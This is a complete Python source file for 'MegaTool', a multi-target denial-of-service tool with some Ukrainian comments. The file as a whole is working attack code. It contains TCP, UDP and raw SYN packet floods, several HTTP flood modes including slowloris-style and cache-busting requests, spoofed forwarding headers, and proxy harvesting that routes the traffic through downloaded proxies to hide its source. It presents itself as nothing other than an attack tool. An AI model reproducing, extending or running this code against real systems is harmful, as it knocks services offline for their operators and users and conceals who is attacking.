#!/usr/bin/env python3
"""
MegaTool
"""

import json
import logging
import os
import random
import re
import socket
import ssl
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Union

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools

L4_METHODS = frozenset({"TCP", "UDP", "SYN"})
L7_METHODS = frozenset({"GET", "POST", "STRESS", "SLOW", "GSB", "BYPASS"})
ALL_METHODS = L4_METHODS | L7_METHODS

from impacket.ImpactPacket import IP, TCP
from requests import Session, get
from yarl import URL

# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt="%H:%M:%S")
logger = logging.getLogger("MegaTool")
logger.setLevel(logging.INFO)

# ----------------------------------------------------------------------
# Завантаження JSON
# ----------------------------------------------------------------------
def load_json_safe(filepath: Path) -> Union[dict, list]:
    raw = filepath.read_text(encoding="utf-8")
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        clean = re.sub(r',\s*([}\]])', r'\1', raw)
        return json.loads(clean)


def validate_config(config: dict) -> None:
    if not isinstance(config, dict):
        raise ValueError("config must be a JSON object")
    targets = config.get("targets")
    if not isinstance(targets, list) or not targets:
        raise ValueError("config must include a non-empty 'targets' list")
    settings = config.get("settings", {})
    if settings is not None and not isinstance(settings, dict):
        raise ValueError("'settings' must be an object")
    for key in ("threads", "rpc"):
        val = settings.get(key, 100 if key == "threads" else 1)
        if not isinstance(val, int) or val < 1:
            raise ValueError(f"settings.{key} must be a positive integer")
    if settings.get("proxy", 0) not in (0, 1):
        raise ValueError("settings.proxy must be 0 or 1")
    for i, target in enumerate(targets):
        if not isinstance(target, dict):
            raise ValueError(f"targets[{i}] must be an object")
        method = target.get("method")
        if not method or not isinstance(method, str):
            raise ValueError(f"targets[{i}] requires a 'method' string")
        method = method.upper()
        if method not in ALL_METHODS:
            raise ValueError(f"targets[{i}] has unsupported method '{method}'")
        target_str = target.get("target")
        if not target_str or not isinstance(target_str, str):
            raise ValueError(f"targets[{i}] requires a 'target' string")
        for key in ("threads", "rpc"):
            if key in target:
                val = target[key]
                if not isinstance(val, int) or val < 1:
                    raise ValueError(f"targets[{i}].{key} must be a positive integer")
        if "proxy" in target and target["proxy"] not in (0, 1):
            raise ValueError(f"targets[{i}].proxy must be 0 or 1")
        if method in L7_METHODS:
            url = URL(target_str)
            if url.scheme not in ("http", "https") or not url.host:
                raise ValueError(f"targets[{i}] must be an http(s) URL")
        else:
            parse_l4_target(target_str)


def parse_l4_target(target_str: str) -> Tuple[str, int]:
    if "://" in target_str:
        _, rest = target_str.split("://", 1)
    else:
        rest = target_str
    if rest.startswith("["):
        if "]:" not in rest:
            raise ValueError(f"invalid Layer 4 target (expected [host]:port): {target_str}")
        host, port_part = rest.split("]:", 1)
        ip_part = host + "]"
    elif ":" in rest:
        ip_part, port_part = rest.rsplit(":", 1)
    else:
        ip_part, port_part = rest, "80"
    try:
        port = int(port_part)
    except ValueError as exc:
        raise ValueError(f"invalid port in target '{target_str}'") from exc
    if not 1 <= port <= 65535:
        raise ValueError(f"port out of range in target '{target_str}'")
    return ip_part, port


def validate_proxy_providers(proxy_providers: list) -> None:
    if not isinstance(proxy_providers, list):
        raise ValueError("proxy.json must be a JSON array")
    for i, provider in enumerate(proxy_providers):
        if not isinstance(provider, dict):
            raise ValueError(f"proxy.json[{i}] must be an object")
        if not provider.get("url"):
            raise ValueError(f"proxy.json[{i}] requires a 'url'")


def l7_stats_key(url: URL) -> str:
    return url.authority or url.host or str(url)


# ----------------------------------------------------------------------
# Утиліти
# ----------------------------------------------------------------------
class Tools:
    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        from math import log2, trunc
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            multiple = min(multiple, len(MULTIPLES) - 1)
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        return str(num)

    @staticmethod
    def sizeOfRequest(res) -> int:
        size = len(res.request.method or "")
        size += len(res.request.url or "")
        size += len('\r\n'.join(f'{k}: {v}' for k, v in res.request.headers.items()))
        if res.request.body:
            size += len(res.request.body)
        size += len(res.content or b"")
        return size

# ----------------------------------------------------------------------
# Layer4 атаки
# ----------------------------------------------------------------------
class Layer4(threading.Thread):
    def __init__(self, target: Tuple[str, int], method: str = "TCP",
                 synevent: threading.Event = None,
                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None):
        super().__init__(daemon=True)
        self._target = target
        self._method = method
        self._synevent = synevent
        self.target_key = target_key
        self.stats_dict = stats_dict
        self.stats_lock = stats_lock
        self.methods = {"UDP": self.UDP, "SYN": self.SYN, "TCP": self.TCP}

    def _running(self) -> bool:
        return self._synevent is None or self._synevent.is_set()

    def run(self):
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._running():
            self.SENT_FLOOD()

    def _update_stats(self, bytes_sent: int):
        if self.stats_dict is not None and self.target_key and self.stats_lock:
            with self.stats_lock:
                if self.target_key not in self.stats_dict:
                    self.stats_dict[self.target_key] = [0, 0]
                self.stats_dict[self.target_key][0] += 1
                self.stats_dict[self.target_key][1] += bytes_sent

    def TCP(self):
        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(.9)
            s.connect(self._target)
            while self._running():
                data = random.randbytes(1024)
                if s.send(data):
                    self._update_stats(len(data))
                else:
                    break

    def UDP(self):
        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while self._running():
                data = random.randbytes(1024)
                if s.sendto(data, self._target):
                    self._update_stats(len(data))
                else:
                    break

    def SYN(self):
        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while self._running():
                pkt = self._genrate_syn()
                if s.sendto(pkt, self._target):
                    self._update_stats(len(pkt))
                else:
                    break

    def _genrate_syn(self):
        ip = IP()
        ip.set_ip_src(socket.gethostbyname(socket.gethostname()))
        ip.set_ip_dst(self._target[0])
        tcp = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(random.randint(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        elif name == "SYN": self.SENT_FLOOD = self.SYN

# ----------------------------------------------------------------------
# Layer7 атаки
# ----------------------------------------------------------------------
class HttpFlood(threading.Thread):
    _proxies: List[Proxy] = None
    _useragents: List[str]
    _referers: List[str]

    def __init__(self, thread_id: int, target: URL, host: str, method: str = "GET",
                 rpc: int = 1, synevent: threading.Event = None,
                 useragents: Set[str] = None, referers: Set[str] = None,
                 proxies: Set[Proxy] = None,
                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None):
        super().__init__(daemon=True)
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (host, target.port or 80)
        self.target_key = target_key
        self.stats_dict = stats_dict
        self.stats_lock = stats_lock
        self.methods = {
            "POST": self.POST,
            "STRESS": self.STRESS,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "BYPASS": self.BYPASS,
        }

        if not referers:
            referers = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                "https://drive.google.com/viewerng/viewer?url=",
            ]
        self._referers = list(referers)
        self._proxies = list(proxies) if proxies else []

        if not useragents:
            useragents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs} HTTP/1.1\r\n"
        self._payload = (
            self._defaultpayload +
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: en-US,en;q=0.9\r\n'
            'Cache-Control: max-age=0\r\n'
            'Connection: keep-alive\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Pragma: no-cache\r\n'
            'Upgrade-Insecure-Requests: 1\r\n'
        )

    def _running(self) -> bool:
        return self._synevent is None or self._synevent.is_set()

    def _update_stats(self, bytes_sent: int):
        if self.stats_dict is not None and self.target_key and self.stats_lock:
            with self.stats_lock:
                if self.target_key not in self.stats_dict:
                    self.stats_dict[self.target_key] = [0, 0]
                self.stats_dict[self.target_key][0] += 1
                self.stats_dict[self.target_key][1] += bytes_sent

    def _pick_proxy(self) -> Optional[Proxy]:
        if self._proxies:
            return random.choice(self._proxies)
        return None

    def select(self, name: str):
        self.SENT_FLOOD = self.GET
        if name in self.methods:
            self.SENT_FLOOD = self.methods[name]

    def run(self):
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._running():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof = ProxyTools.Random.rand_ipv4()
        return (f"X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\nClient-IP: {spoof}\r\n"
                f"X-Forwarded-For: {spoof}\r\nReal-IP: {spoof}\r\n")

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode(self._payload +
                          f"Host: {self._target.authority}\r\n" +
                          self.randHeadercontent +
                          (other or "") + "\r\n")

    def open_connection(self, host=None):
        proxy = self._pick_proxy()
        if proxy:
            sock = proxy.open_socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)
        if self._target.scheme.lower() == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self._target.host,
                                   server_side=False, do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        ua = random.choice(self._useragents)
        ref = random.choice(self._referers) + self._target.human_repr()
        return f"User-Agent: {ua}\r\nReferer: {ref}\r\n" + self.SpoofIP

    @staticmethod
    def getMethodType(method: str) -> str:
        if method.upper() in {"GET", "SLOW", "GSB", "BYPASS"}:
            return "GET"
        elif method.upper() in {"POST", "STRESS"}:
            return "POST"
        return "GET"

    # ---------- Методи атак ----------
    def GET(self):
        payload = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._running():
                    break
                if s.send(payload):
                    self._update_stats(len(payload))

    def POST(self):
        payload = self.generate_payload(
            f"Content-Length: 44\r\nX-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f'{{"data": "{ProxyTools.Random.rand_str(32)}"}}'
        )[:-2]
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._running():
                    break
                if s.send(payload):
                    self._update_stats(len(payload))

    def STRESS(self):
        payload = self.generate_payload(
            f"Content-Length: 524\r\nX-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f'{{"data": "{ProxyTools.Random.rand_str(512)}"}}'
        )[:-2]
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._running():
                    break
                if s.send(payload):
                    self._update_stats(len(payload))

    def BYPASS(self):
        proxy = self._pick_proxy()
        pro = proxy.asRequest() if proxy else None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if not self._running():
                    break
                resp = s.get(self._target.human_repr(), proxies=pro) if pro else s.get(self._target.human_repr())
                self._update_stats(Tools.sizeOfRequest(resp))

    def GSB(self):
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                qs = f"{self._target.raw_path_qs}?qs={ProxyTools.Random.rand_str(6)}"
                payload = str.encode(f"{self._req_type} {qs} HTTP/1.1\r\n"
                                     f"Host: {self._target.authority}\r\n" +
                                     self.randHeadercontent + "\r\n")
                if s.send(payload):
                    self._update_stats(len(payload))

    def SLOW(self):
        payload = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._running():
                    break
                if s.send(payload):
                    self._update_stats(len(payload))
            while self._running() and s.send(payload) and s.recv(1):
                keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
                if s.send(keep):
                    self._update_stats(len(keep))
                time.sleep(self._rpc / 15)

# ----------------------------------------------------------------------
# Проксі-менеджер
# ----------------------------------------------------------------------
class ProxyManager:
    BASE_DIR = Path(__file__).resolve().parent
    CACHE_DIR = BASE_DIR / "cache"
    CACHE_FILE = CACHE_DIR / "proxies.json"
    CACHE_MAX_AGE = 86400  # 24 години

    @staticmethod
    def _load_cache():
        if not ProxyManager.CACHE_FILE.exists():
            return None
        try:
            data = load_json_safe(ProxyManager.CACHE_FILE)
            age = time.time() - data.get("timestamp", 0)
            if age < ProxyManager.CACHE_MAX_AGE:
                proxies = []
                for line in data.get("proxies", []):
                    # line очікується у форматі "IP:PORT"
                    for ptype in (ProxyType.HTTP, ProxyType.SOCKS4, ProxyType.SOCKS5):
                        parsed = ProxyUtiles.parseAllIPPort([line], ptype)
                        if parsed:
                            proxies.extend(parsed)
                            break
                if proxies:
                    logger.info(f"Loaded {len(proxies)} proxies from cache")
                    return proxies
            else:
                logger.info("Cache expired, reloading...")
        except Exception as e:
            logger.warning(f"Cache read error: {e}")
        return None

    @staticmethod
    def _save_cache(proxies: List[Proxy]):
        ProxyManager.CACHE_DIR.mkdir(parents=True, exist_ok=True)
        # Зберігаємо у форматі "host:port", який розпізнає parseAllIPPort
        lines = [f"{p.host}:{p.port}" for p in proxies]
        data = {"timestamp": time.time(), "proxies": lines}
        try:
            with open(ProxyManager.CACHE_FILE, 'w') as f:
                json.dump(data, f)
            logger.debug("Proxy cache saved.")
        except (OSError, IOError) as e:
            logger.warning(f"Could not save proxy cache: {e}")

    @staticmethod
    def get_proxies(proxy_providers: list, check_url: str = None) -> Optional[List[Proxy]]:
        if not proxy_providers:
            return None

        cached = ProxyManager._load_cache()
        if cached:
            return cached

        all_proxies = set()
        with ThreadPoolExecutor(max_workers=len(proxy_providers)) as executor:
            futures = {executor.submit(ProxyManager._download_one, p): p for p in proxy_providers}
            for future in as_completed(futures):
                try:
                    all_proxies.update(future.result())
                except Exception as e:
                    logger.error(f"Download error: {e}")

        logger.info(f"Downloaded {len(all_proxies)} proxies, verifying...")
        test_url = check_url or "http://httpbin.org/get"
        working = ProxyChecker.checkAll(all_proxies, timeout=5, threads=100, url=test_url)
        if not working:
            logger.error("No working proxies found.")
            return None
        logger.info(f"{len(working)} proxies ready.")
        ProxyManager._save_cache(list(working))
        return list(working)

    @staticmethod
    def _download_one(provider: dict) -> Set[Proxy]:
        proxy_type = ProxyType.stringToProxyType(str(provider.get("type", "http")))
        url = provider["url"]
        timeout = provider.get("timeout", 10)
        try:
            resp = get(url, timeout=timeout)
            proxies = set()
            for line in resp.text.splitlines():
                for p in ProxyUtiles.parseAllIPPort([line], proxy_type):
                    proxies.add(p)
            return proxies
        except Exception as e:
            logger.debug(f"Failed to download from {url}: {e}")
            return set()

# ----------------------------------------------------------------------
# Монітор таблиці
# ----------------------------------------------------------------------
def monitor_loop(stop_event: threading.Event, target_stats: dict, stats_lock: threading.Lock,
                 target_keys: List[str], table_height: int):
    prev_total_req = 0
    prev_total_bytes = 0
    data_lines = max(1, table_height - 4)

    while stop_event.is_set():
        with stats_lock:
            snapshot = {key: val.copy() for key, val in target_stats.items()}

        sorted_targets = sorted(snapshot.items(), key=lambda x: x[1][0], reverse=True)
        total_req = sum(val[0] for val in snapshot.values())
        total_bytes = sum(val[1] for val in snapshot.values())
        delta_req = total_req - prev_total_req
        delta_bytes = total_bytes - prev_total_bytes
        prev_total_req = total_req
        prev_total_bytes = total_bytes

        lines = []
        lines.append(f"PPS: {Tools.humanformat(delta_req)} | BPS: {Tools.humanbytes(delta_bytes)}")
        lines.append("-" * 57)
        lines.append(f"{'Target':<30} {'Requests':>10} {'Bytes':>15}")
        lines.append("-" * 57)
        for i in range(data_lines):
            if i < len(sorted_targets):
                tgt, (req, byt) = sorted_targets[i]
                lines.append(f"{tgt:<30} {req:>10} {Tools.humanbytes(byt):>15}")
            else:
                lines.append("")

        sys.stdout.write("\033[s")
        for i in range(table_height):
            text = lines[i] if i < len(lines) else ""
            sys.stdout.write(f"\033[{i+1};1H\033[K{text}")
        sys.stdout.write("\033[u")
        sys.stdout.flush()
        time.sleep(1)

    sys.stdout.write("\033[s")
    for i in range(1, table_height + 1):
        sys.stdout.write(f"\033[{i};1H\033[K")
    sys.stdout.write("\033[u")
    sys.stdout.flush()

# ----------------------------------------------------------------------
# Менеджер атак
# ----------------------------------------------------------------------
class AttackManager:
    def __init__(self, config: dict, proxy_providers: list):
        self.config = config
        self.proxy_providers = proxy_providers
        self.event = threading.Event()
        self.threads: List[threading.Thread] = []
        self.monitor_thread = None
        self.target_stats: Dict[str, List[int]] = {}
        self.stats_lock = threading.Lock()
        self._proxy_list: Optional[List[Proxy]] = None
        self._proxy_fetch_attempted = False
        self.target_keys: List[str] = []
        self.table_height = 0

    def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
        if proxy_enabled == 0:
            return None
        if self._proxy_list is not None:
            return self._proxy_list or None
        if self._proxy_fetch_attempted:
            return None
        self._proxy_fetch_attempted = True
        self._proxy_list = ProxyManager.get_proxies(self.proxy_providers, check_url) or []
        if not self._proxy_list:
            logger.warning("Proxy enabled but no working proxies found; using direct connections.")
        return self._proxy_list or None

    def _join_workers(self, timeout: float = 5.0) -> None:
        deadline = time.time() + timeout
        for worker in self.threads:
            remaining = max(0.01, deadline - time.time())
            if worker.is_alive():
                worker.join(timeout=remaining)
        self.threads.clear()

    def _preview_target_keys(self) -> List[str]:
        keys = []
        for target in self.config.get("targets", []):
            method = target["method"].upper()
            target_str = target["target"]
            if method in L4_METHODS:
                ip_part, port = parse_l4_target(target_str)
                keys.append(f"{target.get('ip') or ip_part}:{port}")
            else:
                keys.append(l7_stats_key(URL(target_str)))
        seen = set()
        unique = []
        for key in keys:
            if key not in seen:
                seen.add(key)
                unique.append(key)
        return unique

    def _spawn_threads(self):
        self._join_workers()
        target_keys = []

        settings = self.config.get("settings", {})
        default_threads = settings.get("threads", 100)
        default_rpc = settings.get("rpc", 1)
        default_proxy = settings.get("proxy", 0)

        ua_list = set(self.config.get("useragents", []))
        if not ua_list:
            ua_list = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"}
        ref_list = set(self.config.get("referers", []))
        if not ref_list:
            ref_list = {"https://www.google.com/", "https://www.bing.com/"}

        for target in self.config.get("targets", []):
            method = target["method"].upper()
            target_str = target["target"]
            ip = target.get("ip")

            threads = target.get("threads", default_threads)
            rpc = target.get("rpc", default_rpc)
            proxy_enabled = target.get("proxy", default_proxy)

            if method in L4_METHODS:
                ip_part, port = parse_l4_target(target_str)
                actual_ip = ip if ip else socket.gethostbyname(ip_part)
                key = f"{actual_ip}:{port}"
                target_keys.append(key)
                for _ in range(threads):
                    t = Layer4((actual_ip, port), method, self.event,
                               target_key=key, stats_dict=self.target_stats, stats_lock=self.stats_lock)
                    self.threads.append(t)
            else:
                url = URL(target_str)
                hostname = url.host
                actual_ip = ip if ip else socket.gethostbyname(hostname)
                key = l7_stats_key(url)
                target_keys.append(key)
                proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                for thread_id in range(threads):
                    t = HttpFlood(thread_id, url, actual_ip, method, rpc,
                                  self.event, ua_list, ref_list,
                                  set(proxies) if proxies else None,
                                  target_key=key, stats_dict=self.target_stats, stats_lock=self.stats_lock)
                    self.threads.append(t)

        seen = set()
        unique_keys = []
        for k in target_keys:
            if k not in seen:
                seen.add(k)
                unique_keys.append(k)
        return unique_keys

    def _calculate_table_height(self):
        try:
            term_height = os.get_terminal_size().lines
        except (ValueError, OSError):
            term_height = 24
        needed = len(self.target_keys) + 4
        max_table = max(5, min(needed, term_height - 2))
        return max_table

    def setup_console(self) -> None:
        self.target_keys = self._preview_target_keys()
        self.table_height = self._calculate_table_height()
        sys.stdout.write("\033[2J\033[H")
        for _ in range(self.table_height):
            print()
        print("Type start/stop/exit")

    def start(self):
        if self.event.is_set():
            logger.warning("Already running")
            return

        self.target_keys = self._spawn_threads()
        self.table_height = self._calculate_table_height()

        sys.stdout.write("\033[2J\033[H")
        for _ in range(self.table_height):
            print()
        print("Type start/stop/exit")

        with self.stats_lock:
            self.target_stats.clear()

        logger.info(f"Launching {len(self.threads)} threads...")
        for t in self.threads:
            t.start()
        self.event.set()

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=0.5)
        self.monitor_thread = threading.Thread(
            target=monitor_loop,
            args=(self.event, self.target_stats, self.stats_lock, self.target_keys, self.table_height),
            daemon=True
        )
        self.monitor_thread.start()

    def stop(self):
        if not self.event.is_set():
            logger.warning("Attack not running.")
            return
        self.event.clear()
        self._join_workers()
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=1.0)
        logger.info("Attack stopped.")

# ----------------------------------------------------------------------
# Консоль
# ----------------------------------------------------------------------
def console(manager: AttackManager):
    manager.setup_console()

    while True:
        prompt_row = manager.table_height + 1
        sys.stdout.write(f"\033[{prompt_row};1H\033[K")
        sys.stdout.flush()
        try:
            cmd = input("MegaTool> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            cmd = "exit"

        if cmd == "start":
            if not manager.event.is_set():
                manager.start()
            else:
                print("Already running.")
        elif cmd == "stop":
            manager.stop()
        elif cmd in ("exit", "quit"):
            if manager.event.is_set():
                manager.stop()
            break
        elif cmd:
            print("Unknown command. Available: start, stop, exit")

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    base_dir = Path(__file__).resolve().parent
    config_path = base_dir / "config.json"
    proxy_path = base_dir / "proxy.json"

    if not config_path.exists():
        print("Error: config.json not found")
        sys.exit(1)
    if not proxy_path.exists():
        print("Error: proxy.json not found")
        sys.exit(1)

    try:
        config = load_json_safe(config_path)
        proxy_providers = load_json_safe(proxy_path)
        validate_config(config)
        validate_proxy_providers(proxy_providers)
    except (json.JSONDecodeError, ValueError) as exc:
        print(f"Configuration error: {exc}")
        sys.exit(1)

    mgr = AttackManager(config, proxy_providers)
    console(mgr)

if __name__ == "__main__":
    main()
